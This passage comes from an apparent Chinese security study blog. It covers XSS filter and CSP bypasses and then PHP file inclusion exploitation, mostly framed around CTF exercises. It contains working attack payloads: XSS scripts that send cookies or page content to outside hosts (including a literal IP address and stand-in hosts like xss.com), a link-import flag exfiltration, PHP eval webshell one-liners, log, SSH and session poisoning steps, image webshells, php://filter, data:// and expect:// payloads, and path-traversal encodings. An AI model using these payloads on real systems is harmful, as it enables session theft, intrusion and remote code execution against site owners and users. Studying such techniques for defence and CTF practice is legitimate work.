&#x27;self&#x27;;script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;) ;//这里可以设置CSP?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;var n0t = document.createElement(&quot;link&quot;);    n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);    n0t.setAttribute(&quot;href&quot;, &quot;http://45.78.29.252:8888/?a=&quot; + String(document.getElementsByTagName(&quot;html&quot;)[0].innerHTML).substring(0,100));    document.head.appendChild(n0t);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n成功获取cookie值\n0x03 XSS绕过技巧\n检索到了一个高级xss绕过备忘录（晦涩难懂）等日后拜读吧\nXSS 过滤器规避 - OWASP 备忘单系列\n0x04 实例解析\n这一部分呢将作为长期更新的地方如果遇到好的xss题目可以联系我，将一些不错的xss题目总结在这里，为的是把理论知识与实践相结合\n0x1 htcf guestbook\n从代码中我们可以看到基本的过滤\nfunction filter($string)&#123;$escape = array(&#x27;\\&#x27;&#x27;,&#x27;\\\\\\\\&#x27;);$escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;;$string = preg_replace($escape, &#x27;_&#x27;, $string);$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;$string = preg_replace($safe, &#x27;hacker&#x27;, $string);$xsssafe = array(&#x27;img&#x27;,&#x27;script&#x27;,&#x27;on&#x27;,&#x27;svg&#x27;,&#x27;link&#x27;);$xsssafe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $xsssafe) . &#x27;/i&#x27;;return preg_replace($xsssafe, &#x27;&#x27;, $string);&#125;\n函数解析：\n1、explode()函数 把字符串打散为数组：\n2、implode()函数 把数组元素组合为字符串：\n&lt;?php\t$str = &#x27;107_lab_2017&#x27;;\t$array=explode(&#x27;_&#x27;, $str);//以下划线为分隔符将字符串打散为数组 \tprint_r($array);\t\techo implode(&#x27;_&#x27;, $array);//以下划线为分隔符将数组合并成字符串?&gt;\n\n我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于\nscrscriptipt这样。\n所以其实关键在于CSP\nContent-Security-Policy:default-src ‘self’; script-src ‘self’ ‘unsafe-inline’; font-src ‘self’ fonts.gstatic.com; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’\n这里上述都已经提到绕过方法主要有两种，一种直接利用跳转，第二种利用预加载\n不熟悉的人可能并不清楚其中的CSP有什么样的问题，事实，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。\n1.跳转绕过：\n&lt;scrscriptipt&gt;window.open(&quot; http://xxxx:8080/cookie.asp?msg= &quot;+document.body)&lt;/scrscr iptipt&gt;&lt;scrscriptipt&gt;window.locatioonn.href%3d&quot;http%3a// www.example.com/xss/write.php%3fdomain%3d &quot;%2bescape(document.cookie)%3b&lt;/sscriptcript&gt;&lt;scrscriptipt&gt;var a=document.createElement(&quot;a&quot;);a.href=&#x27; http://xss.com/?cookie= &#x27;+escape(document.cookie);a.click();&lt;/sscriptcript&gt;\n上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。\n2.chrome对CSP支持的不完整绕过 预加载绕过\n从文章中可以获得对漏洞的整体了解，主要是2篇\n第一篇\nlorexxar大佬的\n后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload\n&lt;Scscriptript&gt;var n0t = document.createElement(&quot;liscriptnk&quot;);n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);n0t.setAttribute(&quot;href&quot;, &quot;//xxx:2333/&quot; + document.cookie);document.head.appendChild(n0t);&lt;/Scscriptript&gt;\n后面xss平台或者vps接受一发搞定\n0x05 0ctf simplexss\n复现一下xss环境。\n实验环境:\n192.168.43.182 （本地主机）\n192.168.43.165 （flag所在地）\n192.168.43.165\n1.php\n主要实现了留言板的功能\n&lt;?php #header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;) ;//这里可以设置CSP?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$a = $_GET[&#x27;a&#x27;];$link = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;*****&quot;,&quot;test&quot;) or die(&quot;error&quot;.mysql_error());if ($link)&#123;    echo 1;    $result = $link-&gt;query(&quot;INSERT INTO yz VALUES (&#x27;$a&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;)&quot;);    if($result)        echo 2;    $re = $link-&gt;query(&quot;SELECT * FROM yz&quot;);    for($i = 0;$i&lt;$re-&gt;num_rows;$i++)    &#123;        $row = $re-&gt;fetch_row();        echo $row[0];    &#125;&#125;?&gt;&lt;script &gt;document.getElementsByClassName(&quot;input&quot;);document.&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n192.168.43.182\n3.php\n&lt;?php  header(&quot;Access-Control-Allow-Origin: *&quot;);?&gt;&lt;script&gt;function getinfo(str) &#123;    var node=document.createElement(&quot;script&quot;);    node.type=&quot;text/javascript&quot;;    node.src=&quot;http://192.168.43.182/2.php?a=1234&quot;+escape(str);    document.getElementsByTagName(&quot;HEAD&quot;)[0].appendChild(node);&#125;var xmlhttp=new XMLHttpRequest();xmlhttp.open(&quot;GET&quot;,&quot;http://127.0.0.1/flag.php&quot;,true);xmlhttp.onreadystatechange=function()&#123;    //if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)    &#123;        getinfo(xmlhttp.responseText);    &#125;&#125;xmlhttp.send();&lt;/script&gt;\n在本地打开浏览器输入\nhttp://192.168.43.165/1.php?a=&lt;link%20rel=import%20href=http://192.168.43.182/3.php&gt;\nimport 会导入远程资源并执行\n当flag端打开1.php查看留言板时会使得3.php脚本执行，从而将flag的内容发送至本地。\n以上我目前看不懂，留着吧…\n5.1 常见标签及属性\n下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。\nscirpt 标签\n 标签用于定义客户端脚本，比如 JavaScript。\n\n&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;\n\n例如：\n\n&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;\n\n**利用payload：**\n\n&lt;script&gt;alert(1)&lt;/script&gt;\n\n#### img 标签\n\n 标签定义 HTML 页面中的图像。\n\n&lt;img src=1 onerror=alert(1);&gt;&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;\n\n#### input 标签\n\n 标签规定了用户可以在其中输入数据的输入字段。\n\nonfocus 事件在对象获得焦点时发生：\n\n&lt;input onfocus=alert(1);&gt;\n\n竞争焦点，从而触发onblur事件：\n\n&lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt;\n\ninput 标签的 autofocus 属性规定当页面加载时  元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：\n\n&lt;input onfocus=&quot;alert(1);&quot; autofocus&gt;\n\n&quot; οnclick=alert(1)&gt;这样需要点击一下输入框&lt;br&gt;&quot; onmouseover=alert(1)&gt;需要鼠标划过输入框&lt;br&gt;\n\n例如：\n\n&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;\n\n分析代码，仍然是使用get方法，从url中接受一个keyword参数，不过这里用到一个过滤函数htmlspecialchars()，这个函数把预定义的字符转换为 HTML 实体，等于","categories":["常见top漏洞"]},{"title":"浅析文件包含","url":"/2023/08/07/%E6%B5%85%E6%9E%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"文件包含总结\n0x01 文件包含的概念：\n把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。\n1.1 文件包含的原理：\n文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。\n1.2 文件包含分类：\n文件包含分为本地文件包含和远程文件包含，而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_ url_ include. 如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_ ur_ include=on, allow_ ur_ fopen = On。在php.ini中，allow_ url_ fopen默认一直是On,而allow_ url_ include从php5.2之后就默认为Off。\n本地文件包含：包含服务器上的资源  //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。远程文件包含：通过HTTP协议包含其他地方的资源\n1.3 文件包含函数：\n1,  include():找不到被包含文件时会产生警告(E_ WARNING) ;\n2，include_ once(): 与include () 类似，代码已经被包含则不会再次包含\n3，require():找不到被包含的文件时会产生致命错误(E_ COMPILE ERROR)\n4，require_ once():与require ()类似，代码已经被包含则不会再次包含\n思维导图：\n\n0x02 PHP伪协议：\nPHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。\n2.1 php://input\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\npoc：?file=php://input[POST DATA] &lt;?php phpinfo();?&gt;\n\n注：利用php://input还可以写入php木马,即在post中传入如下代码：\n&lt;?PHP fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);?&gt;\n例子：\n//test.php&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a= $_GET[&quot;a&quot;];if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;\techo &quot;success\\n&quot;;\techo $flag;&#125;//flag.php&lt;?php$flag = &#x27;flag&#123;flag_is_here&#125;&#x27;;?&gt;\n审计test.php知，当参数$a不为空，且读取的文件中包含’I want flag’时，即可显示$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。\n注：遇到file_get_contents()要想到用php://input绕过。\n2.2 php://filter\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。\n\n\n\n前缀名称\n后加内容\n描述\n\n\n\n\nresource=\n要过滤的数据流\n指定要过滤的数据流\n\n\nread=\n读链的筛选器列表\n参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔\n\n\nwrite=\n写链的筛选器列表\n参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔\n\n\n空\n两个链的筛选器列表\n没有用read=或者write=做前缀的筛选器列表会是轻快应用于读或者写\n\n\n\npoc1:?file=php://filter/resource=xxx.phppoc2:?file=php://filter/read=convert.base64-encode/resource=xxx.php\n为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。php://filter读取文件源代码的时候需要用到编码器php://filter/resource=phpinfo.phpphp://filter/read=convert.base64-encode/resource=phpinfo.phpphp://filter 一般读取文件源代码，然后再进行审计php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。可以直接用不带任何过滤器的filter伪协议payload:file=php://filter/resource=flag.php也可以用一些没有过滤掉的编码方式和转换方式payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.phppayload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php\n怎么写入一句话木马?$filename = $_GET[&#x27;file&#x27;];$content = $_GET[&#x27;content&#x27;];file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);exit() 退出程序这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。\nexit死亡绕过参考：https://xz.aliyun.com/t/8163\nPOC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。\n注：更多php://filter用法可参考：谈一谈php://filter的妙用\neg1:\n&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;\texit(&#x27;hacker!&#x27;);&#125;if($file)&#123;\tinclude($file);&#125;else&#123;\techo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;&#125;?&gt;\n\n尝试payload：?file=php://filter/resource=flag.php，发现无法显示内容：\n尝试payload：?file=php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里：\n2.3 zip://\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\nzip://中只能传入绝对路径。(php版本大于等于php5.3.0)\n\n要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）\n\n只需要是zip的压缩包即可，后缀名可以任意更改。\n\n相同的类型的还有zlib://和bzip2://\nfile=compress.zlib://flag.php\n\npoc:zip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\zip.jpg%23phpinfo.txt\n例子：\n//index.php&lt;meta charset=&quot;utf8&quot;&gt;&lt;?phperror_reporting(0);$file = $_GET[&quot;file&quot;];if (!$file) echo &#x27;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#x27;;if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/)&#123;\techo &quot;hick?&quot;;\texit();&#125;else&#123;\tinclude($file.&quot;.php&quot;);&#125;?&gt;&lt;!-- flag在当前目录的某个文件中 --&gt;\n//upload.php&lt;meta charset=&quot;utf-8&quot;&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt;\t &lt;input type=&quot;file&quot; name=&quot;fupload&quot; /&gt; \t&lt;input type=&quot;submit&quot; value=&quot;upload!&quot; /&gt;&lt;/form&gt;you can upload jpg,png,zip....&lt;br /&gt;&lt;?phpif( isset( $_FILES[&#x27;fupload&#x27;] ) ) &#123;    $uploaded_name = $_FILES[ &#x27;fupload&#x27; ][ &#x27;name&#x27; ];         //文件名    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);   //文件后缀    $uploaded_size = $_FILES[ &#x27;fupload&#x27; ][ &#x27;size&#x27; ];         //文件大小    $uploaded_tmp  = $_FILES[ &#x27;fupload&#x27; ][ &#x27;tmp_name&#x27; ];     // 存储在服务器的文件的临时副本的名称    $target_path = &quot;uploads\\\\&quot;.md5(uniqid(rand())).&quot;.&quot;.$uploaded_ext;    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; || strtolower( $uploaded_ext ) == &quot;zip&quot; ) &amp;&amp;        ( $uploaded_size &lt; 100000 ) ) &#123;        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;// No            echo &#x27;&lt;pre&gt;upload error&lt;/pre&gt;&#x27;;        &#125;        else &#123;// Yes!            echo &quot;&lt;pre&gt;&quot;.dirname(__FILE__).&quot;\\\\&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;        &#125;    &#125;    else &#123;        echo &#x27;&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;&#x27;;    &#125;&#125; ?&gt;     //传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）\n2.4 data://与phar://\ndata:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。(这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。)\n利用条件:\n\nphp版本大于等于php5.2\nallow_url_fopen = On\nallow_url_include = On\n\npoc:若纯文字没用可用[base64编码]data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;?file=data://,&lt;?php phpinfo();?&gt;?file=data://text/plain,&lt;?php phpinfo();?&gt;?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+?file=data:text/plain,&lt;?php phpinfo();?&gt;?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+\nphar:// 有点类似zip://同样可以导致 任意代码执行。\nphar://中相对路径和绝对路径都可以使用利用条件：php版本大于等于php5.3.0\npoc:假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下：指定绝对路径index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt或者使用相对路径（这里test.zip就在当前目录下）index.php?file=phar://test.zip/phpinfo.txt\n2.5 expect://伪协议\nexpect://伪协议用来执行系统命令，但是需要安装拓展\n用法: ?file=expect://ls\n0x03 特殊文件包含\n服务器的中间件，ssh服务都有日志记录的功能。如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。\n如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。\n典型的日志文件包含：\n\n中间件日志文件包含\nssh日志文件包含\n\n中间件日志文件包含\n利用条件：\n\nweb中间件日志文件的存储位置已知，并且具有可读权限\n\n下面开始介绍日志文件包含漏洞利用步骤\n1. 将恶意代码写入到日志文件\n中间件开启了访问日志记录功能，会访问日志写入到日志文件中。\n假设访问URL：http://192.168.1.2/xxx/index.php\n发现会在日志文件中有如下内容：\n[root@aaa]#less /var/log/httpd/access_log192.168.1.200 - - [09/Aug/2021:19:31:20 +0800] &quot;GET /xxx/index.php HTTP/1.1&quot; 200 86....\n中间件日志访问会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。\n利用中间件访问记录路径到日志文件中的功能，将恶意代码写入到日志文件当中去：\n添加恶意代码：http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;\n此时会提示404，但是不急\n查看日志文件，发现已经将内容写入\n[root@aaa]#less /var/log/httpd/access_log192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] &quot;GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1&quot; 404 826....\n虽然已经写入到日志文件中去了，但是浏览器进行了URL编码，导致传入的代码不能正常使用\n可以通过burpsuite抓包的方式写入恶意代码，这样不会被浏览器进行URL编码\n查看日志文件，内容如下\n[root@aaa]#less /var/log/httpd/access_log192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] &quot;GET /xxx/&lt;?php @eval($_POST[123]);?&gt; HTTP/1.1&quot; 404 302....\n恶意代码成功写入\n2. 文件包含日志文件\n要执行文件包含，必须要知道日志文件的位置。\n常见的中间件日志文件都有默认的存储路径，比如Apache的中间件日志文件存在/var/log/httpd/目录下，文件名叫access_log\n输入测试语句http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log\n之后在向网页传入POST参数：123=phpinfo\n即可显示出phpinfo的内容\n3.1 包含Apache日志文件\nWEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。\n利用条件：对日志文件可读知道日志文件的存储目录注意：一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式\nApache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。\n  如果访问一个不存在的资源时，如http://www.xxxx.com/,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。\n参考文章：1.包含日志文件getshell\n     2.一道包含日志文件的CTF题\n这里提供一道包含日志的CTF题目：SHACTF-2017- Bon Appétit (100)-writeup\n3.2 包含SSH log日志文件\n利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log\n下面介绍漏洞利用步骤\n1. 将恶意代码写入文件\nSSH如果开启了日志记录的功能，那么会将ssh的连接日志记录到ssh日志文件当中\n将连接的用户名设置成恶意代码，用命令连接受害者的服务器ip(192.168.1.1)的ssh服务\nssh &quot;&lt;?php @eval($_POST[123]);?&gt;&quot;@192.168.1.1\n查看日志文件/var/log/auth.log，可以观察到恶意代码已经写入到日志文件\n2. 使用文件包含日志文件\n测试输入语句：http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log\n之后再向网页传入POST参数：123=phpinfo\n就可以出现phpinfo的内容了\n参考：[RCE with LFI and SSH Log Poisoning]\n3.3 包含environ\n利用条件：\n\nphp以cgi方式运行，这样environ才会保持UA头。\nenviron文件存储位置已知，且environ文件可读。\n\n姿势：\nproc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。\n可以参考这个：\n\nThe proc/self/environ Injection\nshell via LFI - proc/self/environ method\n\n3.4 包含fd\n与前面的方法类似/proc/self/environ，可以将代码引入 proc 日志文件中，这些代码可以通过易受攻击的 LFI 脚本执行。通常，您会使用 burp 或 curl 将 PHP 代码注入到referer.\n这种方法有点棘手，因为包含 Apache 错误日志信息的 proc 文件在/proc/self/fd/等下发生了变化/proc/self/fd/2。我建议使用 Burp Intruder + FuzzDB 的LFI-FD/proc/self/fd/10暴力破解 /proc/self/fd/ 目录的目录结构-Check.txt可能的 proc 文件列表，然后您可以监控返回的页面大小并进行调查。\n参考： LFI Cheat Sheet：/proc/self/environ LFI Method\n3.5 包含SESSION\n可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。\n利用条件：找到Session内的可控变量Session文件可读写，并且知道存储路径一般通过以下两种方式获取session的存储位置：通过phpinfo的信息获取session的存储位置。通过phpinfo的信息获取session.save_path通过猜测默认的session存储位置进行尝试通常Linux中的Session的默认存储位置在/var/lib/php/session目录下\nphp的session文件的保存路径可以在phpinfo的session.save_path看到。\n\nsession常见存储路径：/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSIDsession文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。\n参考文章：一道SESSION包含的CTF题\n示例分析：\nsession文件包含代码如下\nsession_start();$ctfs=$_GET[&#x27;ctfs&#x27;];$_SESSION[&#x27;username&#x27;]=$ctfs\n此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。\n攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。\n漏洞分析\n上面的代码满足Session文件包含的两个要求\n\nPHP代码将会获取ctfs变量的值存入到session中\nSession的默认 存储位置是/var/lib/php/session\n\n访问URL：http://www.abc.com/xxx/session.php?ctfs=a 会在/var/lib/php/session目录下降ctfs传入的值存储到session中\nSession的文件名以sess_开头，后跟Sessionid，Sessionid可以通过开发者模式获取：\n单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容\n假设通过开发者模式获取到的sessionid的值为hufh7hsdf392eurh4,所以session的文件名为sess_hufh7hsdf392eurh4\n在/var/lib/php/session目录下查看此文件，内容为：username|s:4:“a”\n漏洞利用\n通过上面的分析，可以得知，向ctfs参数传入的内容会存储到session文件中。\n如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行getshell\n例如：访问代码http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/session目录下降ctfs的值写入session文件\nsession文件的内容为：username|s:18:&quot;&lt;?php phpinfo();?&gt;&quot;.\n攻击步骤\n\n将恶意代码写入session文件\n攻击者可以通过PHPinfo或者猜测到session存放的位置\n通过开发者模式可以获得文件名称\n通过本地文件包含漏洞可以解析session文件达到攻击的目的\n\n比如：http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2\n3.6 包含临时文件\n\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf)\n类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：XMAN夏令营-2017-babyweb-writeup\n3.7 包含上传文件\n很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。\n图片马的制作方式如下，在cmd控制台下输入：\n进入1.jph和2.php的文件目录后，执行：copy  1.jpg/b+2.php  3.jpg将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg\n假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg\n图片代码如下：\n&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;&quot;)?&gt;\n然后访问URL：http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php\n3.8 其他包含姿势\n包含SMTP(日志)包含xss\n0x04 绕过方法\n4.1 指定前缀绕过\n4.1.1 目录遍历\n使用 …/…/ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=…/…/phpinfo/phpinfo.php\n测试代码如下：\n&lt;?php\terror_reporting(0);\t$file = $_GET[&quot;file&quot;];\t//前缀\tinclude &quot;/var/www/html/&quot;.$file;\thighlight_file(__FILE__);?&gt;\n现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：\ninclude.php?file=../../log/flag.txt\n则服务器端实际拼接出来的路径为：/var/www/html/…/…/log/test.txt，即 /var/log/flag.txt，从而包含成功。\n4.1.2 编码绕过\n服务器端常常会对于…/等做一些过滤，可以用一些编码来进行绕过。\n1.利用url编码\n../    %2e%2e%2f    ..%2f    %2e%2e/..\\    %2e%2e%5c    ..%5c    %2e%2e\\\n2.二次编码\n../    %252e%252e%252f..\\    %252e%252e%255c\n3.容器/服务器的编码方式\n../    ..%c0%af        注：Why does Directory traversal attack %C0%AF work?    %c0%ae%c0%ae/            注：java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点）        Apache Tomcat Directory Traversal..\\    ..%c1%9c\n注：那里的超链接是：Why does Directory traversal attack %C0%AF work?\n4.2 指定后缀绕过\n后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：\n&lt;?php\terror_reporting(0);\t$file = $_GET[&quot;file&quot;];\t//后缀\tinclude $file.&quot;.txt&quot;;\thighlight_file(__FILE__);?&gt;\n4.2.1 利用url\n在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。\n可参考此文章：URI’s fragment\n完整url格式：\nprotocol :// hostname[:port] / path / [;parameters][?query]#fragment\nquery(?)    [访问参数] ?file=http://localhost:8081/phpinfo.php?    [拼接后]  ?file=http://localhost:8081/phpinfo.php?.txt        上述可能是?截断：    ?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数而被丢弃，成功读取getshell如下：       空格绕过  这里也是一样需要使用编码%20进行绕过，不能直接输入空格。  ?file=http://localhost:8081/phpinfo.php%20.txt    #号绕过：  ?file=http://localhost:8081/phpinfo.php%23.txt\t注：这里需要对#进行url编码，#的url编码为%23\nExample：（设在根目录下有flag2.txt文件）\n\nfragment(#)    [访问参数] ?file=http://localhost:8081/phpinfo.php%23    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt\nExample：（设在根目录下有flag2.txt文件）\n\n其他绕过方式：\n一些常见的特殊字符URL编码：\n\n这里可以用burp爆破一遍，看哪个能用\n4.2.2 利用协议\n利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。\nzip://    [访问参数] ?file=zip://D:\\zip.jpg%23phpinfo    [拼接后]  ?file=zip://D:\\zip.jpg#phpinfo.txtphar://    [访问参数] 